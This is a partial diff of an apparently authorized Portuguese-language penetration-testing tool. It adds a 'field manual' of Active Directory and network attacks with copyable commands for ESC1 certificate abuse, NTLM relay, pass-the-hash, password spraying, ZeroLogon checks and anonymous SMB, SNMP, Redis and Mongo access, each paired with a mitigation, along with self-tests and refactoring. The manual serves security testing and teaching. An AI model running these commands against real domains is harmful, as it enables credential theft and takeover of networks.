+                 "Guarda a configuração atual num JSON antes de alterar. No Certipy v4 use -save-old (sem arquivo)."),
+                ("Pedir o certificado", "certipy-ad req -u 'DOM/USER' -p 'PASS' -dc-ip DC_IP -ca CA -template TEMPLATE -upn administrator@DOM",
+                 "-upn define o titular do certificado; com ESC1 o template aceita o UPN que você escolher."),
+                ("Autenticar com o PFX", "certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP",
+                 "Troca o certificado por um TGT (e imprime o hash NT do usuário, útil para pass-the-hash)."),
+                ("Restaurar o template (v5)", "certipy-ad template -u 'DOM/USER' -p 'PASS' -dc-ip DC_IP -template TEMPLATE -write-configuration TEMPLATE.old.json",
+                 "Devolve o template ao estado original depois do teste. No Certipy v4 use -configuration TEMPLATE.json."),
+                ("Usar o hash obtido", "impacket-wmiexec -hashes :NTHASH administrator@DC_IP",
+                 "O hash veio do certipy auth; executa comando remoto como administrator."),
+            ],
+            "Sessão SMB dos DCs → painel AD CS (marca viável/não viável) e dropdown AD CS (Certipy) com CA/template/usuário já preenchidos.",
+            "Remover permissões de enrollment amplas, exigir aprovação do gerente no template, habilitar EPA/HTTPS no endpoint do CA e assinar LDAP.",
+        ),
+        manual_attack_section(
+            "NTLM Relay",
+            "alto",
+            "É interceptar o envelope lacrado de alguém e reenviar para outro balcão que aceita o mesmo lacre, sem abrir o envelope.",
+            "O NTLM autentica sem provar posse do segredo (desafio/resposta). Se você captura essa resposta e um host aceita repassá-la (SMB sem assinatura, LDAP, HTTP do AD CS), autentica como a vítima sem saber a senha.",
+            [
+                ("Desligar SMB/HTTP do Responder", "sudo sed -i 's/^SMB *= *On/SMB = Off/; s/^HTTP *= *On/HTTP = Off/' /etc/responder/Responder.conf",
+                 "O Responder só envenena LLMNR/NBT-NS; quem recebe a autenticação é o ntlmrelayx."),
+                ("Gerar a lista de alvos", "nxc smb 10.0.0.0/24 --gen-relay-list relay.txt",
+                 "Lista os hosts com SMB signing desabilitado, ou seja, os que aceitam relay."),
+                ("Relay para SMB com SOCKS", "ntlmrelayx.py -tf relay.txt -smb2support -socks -ip 0.0.0.0",
+                 "-tf usa a lista de alvos, -socks guarda as sessões autenticadas e -ip 0.0.0.0 escuta em todas as interfaces."),
+                ("Usar a sessão relayada", "proxychains4 -f proxychains.conf netexec smb DC_IP -u USER -p ANY --shares",
+                 "As sessões ficam no SOCKS local (1080); o proxychains faz o cliente passar por elas."),
+            ],
+            "Sessão SMB → NTLM Relay ⚠️ (só aparece com signing=False), com config ProxyChains e validação incluídas.",
+            "Assinatura SMB obrigatória, LDAP signing/channel binding, desabilitar LLMNR/NBT-NS e bloquear NTLM onde possível.",
+        ),
+        manual_attack_section(
+            "Pass-the-Hash",
+            "alto",
+            "É usar a cópia da chave em vez da chave original: o protocolo aceita o hash como prova, então a senha nem é necessária.",
+            "O NTLM e o Kerberos RC4 aceitam o hash NT como credencial. Com o hash de uma conta privilegiada você autentica em SMB, WMI, WinRM e RDP sem quebrar a senha.",
+            [
+                ("Testar o hash", "nxc smb DC_IP -u USER -H NTHASH --shares",
+                 "-H recebe o hash NT (32 hex) no lugar da senha; mostra se a conta é admin local."),
+                ("Executar com Impacket", "impacket-wmiexec -hashes :NTHASH 'DOM/USER@DC_IP' whoami",
+                 "O campo antes dos dois-pontos é o LM (vazio); o segundo é o NT."),
+                ("Sessão WinRM", "evil-winrm -i DC_IP -u USER -H NTHASH",
+                 "Abre shell remoto via WinRM usando o hash, sem senha."),
+            ],
+            "Sessão SMB → Impacket/Pass-the-Hash e WinRM → Evil-WinRM, com o hash capturado preenchido.",
+            "Contas locais únicas por máquina (LAPS), remover privilégios administrativos amplos e bloquear NTLM.",
+        ),
+        manual_attack_section(
+            "Password Spraying",
+            "médio",
+            "É tentar a mesma senha em vários crachás: uma senha comum contra muitos usuários costuma passar batido e evita bloqueio de uma conta só.",
+            "Em vez de muitas senhas para um usuário (que bloqueia a conta), testa-se poucas senhas comuns contra muitos usuários, respeitando o intervalo entre tentativas.",
+            [
+                ("Spray com Kerberos", "kerbrute passwordspray --dc DC_IP -d DOM users.txt 'Inverno2025!'",
+                 "Valida a senha sem logon interativo; gera 4768 e respeita o -t de threads."),
+                ("Spray com NetExec", "nxc smb DC_IP -u users.txt -p 'Inverno2025!' --continue-on-success",
+                 "--continue-on-success mostra todos os acertos; sem isso para no primeiro válido."),
+            ],
+            "Comandos 2 e 4 (--password-file) com --auth-attack-mode single-pass para uma senha contra a lista inteira.",
+            "Política de senha forte, bloqueio de conta calibrado, MFA e monitorar muitos 4625 no mesmo minuto.",
+        ),
+        manual_attack_section(
+            "Sessão nula / anônima em SMB",
+            "médio",
+            "É entrar no prédio como visitante: a portaria deixa passar sem crachá e, às vezes, o visitante enxerga a planta dos andares.",
+            "O SMB permite sessão sem usuário (null) quando o servidor aceita. Ela pode listar shares, usuários e grupos, o que entrega o mapa do domínio sem nenhuma senha.",
+            [
+                ("Testar sessão nula", "nxc smb DC_IP -u '' -p '' --shares --users",
+                 "Sem credencial: se responder, o servidor aceita visitante e entrega shares/usuários."),
+                ("Listar com smbclient", "smbclient -L //DC_IP -N",
+                 "-N tenta sem senha; lista os compartilhamentos visíveis para anônimo."),
+                ("RPC anônimo", "rpcclient -U '%' -N DC_IP -c 'srvinfo;enumdomusers'",
+                 "Consulta o RPC sem credencial para obter usuários e grupos do domínio."),
+            ],
+            "Enumeração SMB automática (nxc/smbclient/rpcclient/enum4linux) e coluna Auth do relatório.",
+            "Restringir acesso anônimo (RestrictAnonymous/RestrictNullSessAccess) e revisar permissões de shares.",
+        ),
+        manual_attack_section(
+            "SMBv1 e ausência de assinatura",
+            "médio",
+            "É uma porta antiga sem fechadura eletrônica: qualquer um com a chave física entra, e o recado pode ser trocado no caminho.",
+            "SMBv1 tem falhas exploráveis (EternalBlue) e não tem as proteções modernas. Sem assinatura obrigatória, o SMB também fica exposto a relay de autenticação.",
+            [
+                ("Checar protocolo", "nmap -Pn -p 445 --script smb-protocols DC_IP",
+                 "Mostra os dialetos aceitos; 'NT LM 0.12' indica SMBv1 habilitado."),
+                ("Checar assinatura", "nxc smb DC_IP --gen-relay-list relay.txt",
+                 "Hosts que entram na lista têm signing desabilitado e são alvos de relay."),
+            ],
+            "Coluna SMBv1 (⚠ TRUE) e botão NTLM Relay na sessão SMB.",
+            "Desabilitar SMBv1, exigir assinatura SMB e atualizar o sistema.",
+        ),
+        manual_attack_section(
+            "ZeroLogon (CVE-2020-1472)",
+            "crítico",
+            "É a fechadura do cofre que aceita uma chave em branco: o protocolo Netlogon aceita um desafio zerado e autentica como a própria máquina.",
+            "Falha criptográfica no Netlogon permite autenticar como a conta de máquina do DC e, a partir dela, extrair o hash do computador e resetar a senha do domínio.",
+            [
+                ("Verificar vulnerabilidade", "nxc smb DC_IP -u '' -p '' -M zerologon",
+                 "O módulo testa se o DC aceita o desafio zerado, sem alterar nada."),
+                ("Explorar (ambiente autorizado)", "python3 zerologon_tester.py DC01 DC_IP",
+                 "Confirma a falha; a exploração real derruba a conta de máquina e exige plano de recuperação."),
+            ],
+            "Sessão SMB de DCs → botão ZeroLogon (sequência pronta, nunca executada automaticamente).",
+            "Aplicar o patch de agosto/2020 e o enforcement do Netlogon; monitorar eventos 5827/5828.",
+        ),
+        manual_attack_section(
+            "SNMP com community padrão",
+            "médio",
+            "É o interfone da portaria com senha de fábrica: quem sabe o código ouve tudo o que a portaria vê.",
+            "SNMP v1/v2c autentica apenas com uma string (community). Com 'public' ou 'private' é possível ler configuração, interfaces, processos e, às vezes, gravar valores.",
+            [
+                ("Testar communities", "for c in public private community snmp; do snmpwalk -v2c -c \"$c\" udp:DC_IP:161 1.3.6.1.2.1.1; done",
+                 "Percorre a lista e usa o grupo system (1.3.6.1.2.1.1) para confirmar leitura."),
+                ("Coletar mais dados", "snmpwalk -v2c -c public udp:DC_IP:161",
+                 "Sem OID, percorre toda a MIB: interfaces, rotas, processos e usuários locais."),
+            ],
+            "Enumeração SNMP automática (14 communities no OID 1.3.6.1.2.1.1) e sessão SNMP do relatório.",
+            "Usar SNMPv3 com autenticação/criptografia, trocar communities e restringir por ACL.",
+        ),
+        manual_attack_section(
+            "Serviços sem autenticação (FTP/Redis/Mongo)",
+            "médio",
+            "É o armário do corredor que abre sem chave: o serviço está ligado e aceita qualquer um.",
+            "Serviços de dados expostos frequentemente aceitam acesso anônimo (FTP) ou nenhuma senha (Redis/MongoDB). O acesso costuma significar leitura e escrita de dados, e às vezes execução de comandos.",
+            [
+                ("FTP anônimo", "printf 'anonymous\\nanonymous\\npwd\\nls\\nbye\\n' | ftp -inv -p HOST_IP 21",
+                 "Testa o usuário anonymous; se listar arquivos, há dados expostos."),
+                ("Redis sem senha", "redis-cli -h HOST_IP -p 6379 INFO",
+                 "INFO responde sem AUTH quando o serviço está aberto (e permite CONFIG SET para RCE)."),
+                ("MongoDB sem senha", "mongosh --host HOST_IP --port 27017 --eval 'db.adminCommand({listDatabases:1})'",
+                 "Lista bases sem credencial quando a autenticação está desligada."),
+            ],
+            "Enumeração de FTP/Redis/Mongo automática e botões por serviço.",
+            "Bind em localhost, autenticação obrigatória, firewall e nunca expor bancos à rede interna.",
+        ),
+        manual_attack_section(
+            "Mapeamento e montagem de shares",
+            "médio",
+            "É abrir a gaveta do colega que ficou destrancada: o arquivo sensível está ali, com o nome do dono na etiqueta.",
+            "Depois de obter uma credencial válida, o atacante lista os compartilhamentos, confirma quais aceitam leitura/escrita e monta localmente para procurar dados sensíveis.",
+            [
+                ("Listar shares", "smbclient -L //HOST_IP -U 'DOM/USER%PASS'",
+                 "Mostra os compartilhamentos disponíveis para aquele usuário."),
+                ("Validar acesso", "smbclient //HOST_IP/SHARE -U 'DOM/USER%PASS' -c 'ls'",
+                 "Um ls bem-sucedido prova leitura real no share (não só visibilidade)."),
+                ("Montar localmente", "sudo mount -t cifs //HOST_IP/SHARE /mnt/share -o username=USER,domain=DOM",
+                 "Monta o share para buscar arquivos com grep/find; evidência de acesso efetivo."),
+            ],
+            "Sessão SMB → coluna Shares, botões SMBClient/Mount CIFS (somente shares validados por ls).",
+            "Revisar permissões de share e NTFS, remover Everyone/leitura ampla e habilitar auditoria de acesso.",
+        ),
+    ]
+    intro = (
+        '<div class="panel">'
+        "<h2>Manual de Campo</h2>"
+        '<div class="muted">Referência rápida dos ataques que o bird scan cataloga e executa (ou prepara o comando). '
+        "Cada item traz a ideia em uma analogia, o funcionamento, comandos reais comentados, onde o achado aparece no "
+        "relatório e a mitigação. Placeholders: <span class=\"mono\">DOM</span>, <span class=\"mono\">DC_IP</span>, "
+        "<span class=\"mono\">USER</span>, <span class=\"mono\">PASS</span>, <span class=\"mono\">NTHASH</span>, "
+        "<span class=\"mono\">SID</span>, <span class=\"mono\">CA</span>, <span class=\"mono\">TEMPLATE</span>, "
+        "<span class=\"mono\">ATTACKER_IP</span>. Na sessão SMB/KERBEROS os mesmos comandos aparecem preenchidos "
+        "com os dados capturados.</div>"
+        "</div>"
+    )
+    return intro + '<div class="group-list">' + "".join(sections) + "</div>"
 
 
 def ntlm_relay_network(ip: str) -> str:
@@ -12275,16 +13148,6 @@ def service_primary_commands_by_tool(service: ServiceRecord, state: ScanState) -
             if zero_commands:
                 commands["ZeroLogon"] = zero_commands
 
-        # AD-only attack surface: Golden/Silver ticket and AD CS.  These are
-        # multi-step, per-host operations with captured material (SID/KRBTGT/
-        # certificate), so they stay out of the group-wide target loops.
-        if is_ad_host(state, ip):
-            for tool_name, tool_commands in ticket_attack_commands(service, state).items():
-                commands.setdefault(tool_name, []).extend(tool_commands)
-            for tool_name, tool_commands in adcs_commands(service, state).items():
-                commands.setdefault(tool_name, []).extend(tool_commands)
-
-            
         # Add WinRM commands if WinRM is available and creds exist
         if creds:
             winrm_ports = [s.port for s in state.services if s.ip == ip and (s.port in WINRM_PORTS or "winrm" in (s.service or "").lower() or "wsman" in (s.service or "").lower())]
@@ -12436,7 +13299,16 @@ def service_primary_commands_by_tool(service: ServiceRecord, state: ScanState) -
         commands["AS-REP Roasting"] = asrep_cmds
         if kerberoast_cmds:
             commands["Kerberoasting"] = kerberoast_cmds
-            
+
+        # AD-specific attack surface lives in the KERBEROS session: Golden/Silver
+        # ticket and AD CS.  They are multi-step per-DC workflows, so they stay
+        # out of the group-wide target loops.
+        if is_ad_dc(state, ip):
+            for tool_name, tool_commands in ticket_attack_commands(service, state).items():
+                commands.setdefault(tool_name, []).extend(tool_commands)
+            for tool_name, tool_commands in adcs_commands(service, state).items():
+                commands.setdefault(tool_name, []).extend(tool_commands)
+
         return commands
     if group == "DATABASE/DATA":
         service_name = (service.service or "").lower()
@@ -13516,6 +14388,10 @@ Group: 'Domain Admins' (RID: 512) has member: ACME\\alice
     ]
     ad_state.upsert_host("10.10.10.70", hostname="dc01", fqdn="dc01.acme.local", domain="acme.local")
     ad_state.upsert_host("10.10.10.71", hostname="srv01")
+    # Domain-joined member server: it is AD, but ticket/AD CS workflows belong to
+    # the DC only.
+    ad_state.services.append(ServiceRecord(ip="10.10.10.74", port=445, protocol="tcp", service="microsoft-ds"))
+    ad_state.upsert_host("10.10.10.74", hostname="srv02", fqdn="srv02.acme.local", domain="acme.local")
     ad_state.evidence.extend(
         [
             Evidence(
@@ -13540,7 +14416,10 @@ Group: 'Domain Admins' (RID: 512) has member: ACME\\alice
     )
     ad_dc_smb = [service for service in ad_state.services if service.ip == "10.10.10.70" and service.port == 445][0]
     ad_non_dc_smb = [service for service in ad_state.services if service.ip == "10.10.10.71"][0]
-    ad_commands = service_primary_commands_by_tool(ad_dc_smb, ad_state)
+    ad_member_smb = [service for service in ad_state.services if service.ip == "10.10.10.74"][0]
+    # Ticket/AD CS workflows belong to the KERBEROS session now.
+    ad_kerberos_service = [service for service in ad_state.services if service.port == 88][0]
+    ad_commands = service_primary_commands_by_tool(ad_kerberos_service, ad_state)
     ad_golden_text = " ".join(command for _, command in ad_commands.get("Golden Ticket 🎫", []))
     ad_silver_text = " ".join(command for _, command in ad_commands.get("Silver Ticket 🎫", []))
     ad_capture_text = " ".join(command for _, command in ad_commands.get("Capturar SID/KRBTGT", []))
@@ -13549,6 +14428,88 @@ Group: 'Domain Admins' (RID: 512) has member: ACME\\alice
     ad_smb_group_html = service_group_actions("SMB", [ad_dc_smb, ad_non_dc_smb], ad_state)
     ad_kerberos_table = kerberos_service_group_table([ad_state.services[0]], {}, ad_state)
     ad_hashes = kerberos_captured_hashes(ad_state)
+    ad_member_commands = service_primary_commands_by_tool(ad_member_smb, ad_state)
+
+    # Credencial usada nos comandos de ticket/AD CS: domínio vence local, e uma
+    # credencial somente local nunca entra num comando de domínio.
+    def ad_fixture_state(label: str, credentials: list[tuple[str, str, str, str]]) -> ScanState:
+        fixture = ScanState(run_id=label, started_at="", output_dir=str(output_dir))
+        fixture.services = [
+            ServiceRecord(ip="10.10.10.70", port=88, protocol="tcp", service="kerberos-sec"),
+            ServiceRecord(ip="10.10.10.70", port=389, protocol="tcp", service="ldap"),
+            ServiceRecord(ip="10.10.10.70", port=445, protocol="tcp", service="microsoft-ds"),
+        ]
+        fixture.upsert_host("10.10.10.70", hostname="dc01", fqdn="dc01.acme.local", domain="acme.local")
+        for username, password, domain, scope in credentials:
+            fixture.evidence.append(Evidence(
+                category="smb", ip="10.10.10.70", port=445, service="smb",
+                title=f"Auth accepted — {username}", description="accepted",
+                data={"auth_result": "accepted", "auth_method": "password", "username": username,
+                      "password": password, "domain": domain, "auth_scope": scope},
+            ))
+        return fixture
+
+    # Plano de autenticação: o modo pitchfork testa apenas min(listas) pares.
+    plan_users = fixture_dir / "plan-users.txt"
+    plan_passwords = fixture_dir / "plan-passwords.txt"
+    plan_users.write_text("\n".join(f"user{i}" for i in range(20)) + "\n", encoding="utf-8")
+    plan_passwords.write_text("\n".join(f"pass{i}" for i in range(20)) + "\n", encoding="utf-8")
+    plan_args = build_arg_parser().parse_args([
+        "--from-nmap", "x", "--username-file", str(plan_users),
+        "--password-file", str(plan_passwords), "--domain", "ACME.LOCAL",
+    ])
+    plan_state = ScanState(run_id="plan", started_at="", output_dir=str(output_dir))
+    plan_state.services = [ServiceRecord(ip="10.0.0.70", port=445, protocol="tcp", service="microsoft-ds")]
+    plan_summary = auth_plan_summary(plan_args, plan_state)
+    plan_text = "\n".join(auth_plan_lines(plan_summary))
+    plan_flag_args = build_arg_parser().parse_args(["--auth-plan"])
+
+    # Guarda de execução: a fase de autenticação precisa rodar até o fim mesmo
+    # quando nenhum serviço tem validador (o laço de cobertura roda antes).
+    guard_users = fixture_dir / "guard-users.txt"
+    guard_passwords = fixture_dir / "guard-passwords.txt"
+    guard_users.write_text("alice\n", encoding="utf-8")
+    guard_passwords.write_text("Pass!1\n", encoding="utf-8")
+    guard_args = build_arg_parser().parse_args([
+        "--from-nmap", "x", "--username-file", str(guard_users),
+        "--password-file", str(guard_passwords),
+    ])
+    guard_state = ScanState(run_id="guard", started_at="", output_dir=str(output_dir))
+    guard_state.services = [ServiceRecord(ip="10.0.0.80", port=9999, protocol="tcp", service="other")]
+    auth_phase_ok = True
+    try:
+        run_credential_auth_enumeration(guard_args, guard_state, Logger(quiet=True))
+    except Exception:
+        auth_phase_ok = False
+    guard_coverage = next(
+        (item for item in guard_state.evidence if item.title == "Cobertura de autenticação"),
+        None,
+    )
+    auth_coverage_data_ok = bool(
+        guard_coverage
+        and "hash(es)" in guard_coverage.description
+        and guard_coverage.data.get("pairs") is not None
+        and guard_coverage.data.get("users") == 1
+    )
+
+    ad_local_fixture = ad_fixture_state("ad-local", [("alice", "LocalP@ss", "", "local")])
+    ad_local_credential, ad_local_kind = ad_primary_credential(ad_local_fixture, "10.10.10.70")
+    ad_local_adcs_text = " ".join(
+        command for _, command in service_primary_commands_by_tool(
+            ad_local_fixture.services[0], ad_local_fixture
+        ).get("AD CS (Certipy)", [])
+    )
+    ad_mixed_fixture = ad_fixture_state("ad-mixed", [
+        ("alice", "LocalP@ss", "", "local"),
+        ("alice", "DomainP@ss", "ACME.LOCAL", "domain"),
+    ])
+    ad_mixed_credential, ad_mixed_kind = ad_primary_credential(ad_mixed_fixture, "10.10.10.70")
+    ad_smb_body = service_group_body("SMB", [ad_dc_smb], [], {}, ad_state)
+    ad_kerberos_body = service_group_body("KERBEROS", [ad_state.services[0]], [], {}, ad_state)
+    ad_member_panel = ad_attack_panel([ad_member_smb], ad_state)
+    manual_html = attack_manual_html()
+    manual_commands = credential_args_for_attempt(argparse.Namespace(kerberos=False), "nxc", username="u", password="p", local_auth=False)
+    manual_commands_local = credential_args_for_attempt(argparse.Namespace(kerberos=False), "nxc", username="u", password="p", local_auth=True)
     ad_web_group_html = service_group_command_buttons(
         [service for service in ad_state.services if service.port in {80, 8080}], ad_state
     )
@@ -13575,6 +14536,70 @@ Group: 'Domain Admins' (RID: 512) has member: ACME\\alice
         ]
     )
     ad_certipy_parsed = parse_certipy_find_output(ad_certipy_sample)
+
+    # Response capture: a bounded in-memory copy must still be recoverable from
+    # the RAW file, otherwise a success line outside the window is lost.
+    capture_dir = Path(output_dir) / "capture-check"
+    capture_dir.mkdir(parents=True, exist_ok=True)
+    truncated_result = run_command(
+        [sys.executable, "-c", "print('x' * 400); print('[+] alice:Pass (Pwn3d!)')"],
+        timeout=30,
+        output_file=capture_dir / "capture.txt",
+        capture_limit_bytes=80,
+    )
+    capture_recovered = bool(
+        truncated_result.output_truncated
+        and "[+] alice" in command_transcript(truncated_result)
+    )
+    # Resumed state: text ports are coerced, impossible ports are rejected with a
+    # clean usage error instead of crashing the exporters later.
+    bad_state_payload = {
+        "run_id": "bad", "started_at": "", "output_dir": str(capture_dir),
+        "hosts": {}, "web_endpoints": [], "evidence": [], "dependencies": {}, "metadata": {},
+        "targets": [], "services": [{"ip": "10.0.0.5", "port": None, "protocol": "tcp"}],
+    }
+    bad_state_path = capture_dir / "bad-state.json"
+    bad_state_path.write_text(json.dumps(bad_state_payload), encoding="utf-8")
+    bad_state_rejected = False
+    try:
+        load_state(bad_state_path)
+    except BirdScanUsageError:
+        bad_state_rejected = True
+    good_state_payload = dict(bad_state_payload)
+    good_state_payload["services"] = [{"ip": "10.0.0.5", "port": "445", "protocol": "tcp"}]
+    good_state_path = capture_dir / "good-state.json"
+    good_state_path.write_text(json.dumps(good_state_payload), encoding="utf-8")
+    try:
+        coerced_state = load_state(good_state_path)
+        text_port_coerced = coerced_state.services[0].port == 445
+    except BirdScanUsageError:
+        text_port_coerced = False
+    # Unbracketed IPv6 must keep the address whole instead of producing hosts
+    # like "1" or "eth0" from the port fragment.
+    ipv6_plain_path = fixture_dir / "ipv6-plain.txt"
+    ipv6_plain_path.write_text("2001:db8::1:443\n[2001:db8::2]:445\nfe80::1%eth0:22\n", encoding="utf-8")
+    ipv6_plain_state = ScanState(run_id="v6-plain", started_at="", output_dir=str(output_dir))
+    try:
+        parse_ip_port_file(ipv6_plain_path, ipv6_plain_state, Logger(quiet=True))
+        unbracketed_ipv6_ok = {
+            (service.ip, service.port) for service in ipv6_plain_state.services
+        } == {
+            ("2001:db8::1", 443),
+            ("2001:db8::2", 445),
+            ("fe80::1%eth0", 22),
+        }
+    except BirdScanUsageError:
+        unbracketed_ipv6_ok = False
+
+    raw_cred_path = fixture_dir / "raw-credentials.txt"
+    raw_cred_path.write_bytes(
+        b"alice\n#Senha#123\nPass#123\n senha com espaco \n\nbob\r\n"
+    )
+    raw_entries = load_credential_list_file(str(raw_cred_path))
+    comment_entries = load_credential_list_file(str(raw_cred_path), allow_comments=True)
+    raw_cred_args = build_arg_parser().parse_args(
+        ["--target", "10.0.0.1", "--password-file", str(raw_cred_path)]
+    )
 
     checks = [
         ("hosts", len(state.hosts) == 5, f"expected 5 hosts, got {len(state.hosts)}"),
@@ -13726,6 +14751,27 @@ Group: 'Domain Admins' (RID: 512) has member: ACME\\alice
         ("ad-panel-badges", "Golden / Silver Ticket e AD CS" in ad_panel_html and "AD CS: teste viável" in ad_panel_html and "KRBTGT capturado" in ad_panel_html, "AD panel must show the viability badges"),
         ("ad-group-loop-excludes-workflows", "Golden Ticket" not in ad_smb_group_html and "AD CS (Certipy)" not in ad_smb_group_html, "multi-step AD workflows must stay out of group loops"),
         ("ad-non-ad-host-no-tickets", "Golden Ticket 🎫" not in service_primary_commands_by_tool(ad_non_dc_smb, ad_state), "non-AD SMB host must not expose ticket commands"),
+        ("ad-ticket-dc-only", "Golden Ticket 🎫" not in ad_member_commands and "AD CS (Certipy)" not in ad_member_commands, "domain-joined member server must not expose ticket/AD CS workflows"),
+        ("auth-plan-effective-pairs", plan_summary["mode"] == "pitchfork" and plan_summary["base_pairs"] == 20 and plan_summary["effective_pairs"] == 40 and plan_summary["combinations"] == 400, "the plan must expose how few combinations pitchfork tests"),
+        ("auth-plan-warning", "ATENÇÃO" in plan_text and "clusterbomb" in plan_text, "the plan must warn when coverage is reduced"),
+        ("auth-plan-cli", plan_flag_args.auth_plan is True, "--auth-plan must be accepted"),
+        ("auth-phase-runs-to-completion", auth_phase_ok, "the credential phase must not abort (undefined name / exception)"),
+        ("auth-coverage-carries-plan", auth_coverage_data_ok, "coverage evidence must carry the plan numbers"),
+        ("ad-credential-domain-preferred", ad_mixed_credential is not None and str((ad_mixed_credential or {}).get("domain") or "").upper() == "ACME.LOCAL" and ad_mixed_kind in {"domain", "validated"}, "the domain credential must win over a local-only one"),
+        ("ad-credential-local-rejected", ad_local_credential is None and ad_local_kind == "local", "a local-only credential must never be used in domain commands"),
+        ("ad-local-only-placeholders", "USUARIO" in ad_local_adcs_text and "LocalP@ss" not in ad_local_adcs_text, "local-only case must fall back to placeholders"),
+        ("ad-certipy-no-d-flag", " -d " not in ad_adcs_text and "-dc-ip" in ad_adcs_text, "certipy v5 dropped -d; the domain must travel inside -u"),
+        ("ad-commands-in-kerberos-session", "Golden Ticket" not in ad_smb_body and "Golden Ticket" in ad_kerberos_body and "Golden / Silver Ticket e AD CS" in ad_kerberos_body, "ticket/AD CS workflows must live in the KERBEROS session only"),
+        ("ad-panel-dc-only", "AD — Golden / Silver Ticket e AD CS" not in ad_member_panel and "AD — Golden / Silver Ticket e AD CS" in ad_panel_html, "the AD panel must render only for DCs"),
+        ("manual-tab-sections", "Manual de Campo" in manual_html and manual_html.count("<details") >= 14 and "Golden Ticket" in manual_html and "NTLM Relay" in manual_html and "Pass-the-Hash" in manual_html, "the didactic manual tab must document the main attacks"),
+        ("manual-commands-copyable", manual_html.count("Copiar comando") >= 30 and "impacket-ticketer" in manual_html, "manual commands must be copyable"),
+        ("command-menu-fixed-position", ".command-dropdown-menu" in report_text and "position: fixed" in report_text.split(".command-dropdown-menu", 1)[1][:400] and "positionCommandMenu" in report_text, "command menu must be fixed-positioned and clamped (no clipping/off-screen)"),
+        ("panel-no-backdrop-filter", "backdrop-filter: blur" not in report_text.split(".panel {", 1)[1][:500], "the panel must not create a containing block that clips dropdowns"),
+        ("local-auth-flag-split", "--local-auth" in " ".join(manual_commands_local[0]) and "--local-auth" not in " ".join(manual_commands[0]), "local SAM and service-default attempts must build different commands"),
+        ("response-capture-recovery", capture_recovered, "a truncated in-memory capture must be recovered from the RAW file for parsing"),
+        ("state-port-validation", bad_state_rejected, "a resumed state with an impossible port must fail with a clean usage error"),
+        ("state-port-coercion", text_port_coerced, "a resumed state with a text port must be coerced to int"),
+        ("ipv6-unbracketed-import", unbracketed_ipv6_ok, "unbracketed IPv6 in IP:PORT input must not create phantom hosts"),
         ("kerberos-hash-column", "<th>HASH</th>" in ad_kerberos_table and "Copiar hash" in ad_kerberos_table and "svc_sql" in ad_kerberos_table, "Kerberos session must expose captured hashes in a HASH column"),
         ("kerberos-hashes-parsed", {(entry["user"], entry["type"]) for entry in ad_hashes} == {("svc_sql", "TGS"), ("bob", "AS-REP")}, "captured Kerberos hashes were not parsed"),
         ("kerberos-summary-not-in-overview", "Kerberos Attacks" not in report_text.split('id="tab-overview"')[1].split("</section>")[0], "Kerberoasting summary must live in the KERBEROS session, not in the overview"),
@@ -13734,6 +14780,8 @@ Group: 'Domain Admins' (RID: 512) has member: ACME\\alice
         ("ntlm-relay-24", ntlm_relay_network("10.10.10.70") == "10.10.10.0/24", "relay list must cover the /24"),
         ("ntlm-relay-attacker-zero", any("0.0.0.0" in value and "-ip" in value for value in ad_relay_commands.values()), "relay must use 0.0.0.0 as the attacker address"),
         ("ntlm-relay-proxychains-config", any("BIRDSCAN_PROXYCHAINS" in value for value in ad_relay_commands.values()) and any(value.startswith('PC="$(') for value in ad_relay_commands.values()) and "socks5 127.0.0.1 1080" in proxychains_config_content(), "relay must ship a validatable ProxyChains config"),
+        ("credential-list-raw", raw_entries == ["alice", "#Senha#123", "Pass#123", " senha com espaco ", "bob"], f"credential lists must be used exactly as written, got {raw_entries!r}"),
+        ("credential-list-comments-optin", comment_entries == ["alice", "Pass", "senha com espaco", "bob"] and raw_cred_args.credential_comments is False, f"--credential-comments must be the only way to drop '#' lines, got {comment_entries!r}"),
         ("snmp-community-list", "for c in" in ad_snmp_commands["SNMPWalk"][0][1] and "private" in ad_snmp_commands["SNMPWalk"][0][1] and SNMP_SYSTEM_OID in ad_snmp_commands["SNMPWalk"][0][1], "SNMP must test a community list against the system OID"),
     ]
     failures = [f"{name}: {detail}" for name, passed, detail in checks if not passed]
@@ -13819,6 +14867,8 @@ def main(argv: list[str]) -> int:
             if is_single_ip_or_hostname(target):
                 state.upsert_host(target, sources=["cli-target"])
         save_state(state)
+        if getattr(args, "auth_plan", False):
+            return print_auth_plan(args, state, logger)
         if args.reauth_only:
             logger.stage("Reautenticação", "validando credenciais e executando enumeração pós-auth")
             run_reauth_workflow(args, state, logger)
@@ -13895,6 +14945,25 @@ def main(argv: list[str]) -> int:
     except BirdScanError as exc:
         logger.warn(str(exc))
         return 2
+    except Exception as exc:  # noqa: BLE001 - last-resort guard for long runs
+        # A long scan must not lose its state to an unexpected error.  Always
+        # report the failure type/message; the traceback stays behind -v.
+        logger.warn(f"Erro inesperado: {type(exc).__name__}: {exc}")
+        if getattr(args, "verbose", False):
+            import traceback
+
+            traceback.print_exc()
+        if "state" in locals():
+            try:
+                collect_kerbrute_results(args, state, finish=True)
+            except Exception:  # pragma: no cover - never mask the original error
+                pass
+            try:
+                save_state(state)
+                logger.warn("Estado salvo antes de encerrar; use --resume para continuar.")
+            except Exception as save_exc:  # pragma: no cover
+                logger.warn(f"Não foi possível salvar o estado: {save_exc}")
+        return 3
     finally:
         if getattr(args, "_kerbrute_jobs", {}) and not getattr(args, "_kerbrute_finalized", False) and "state" in locals():
             collect_kerbrute_results(args, state, finish=True)
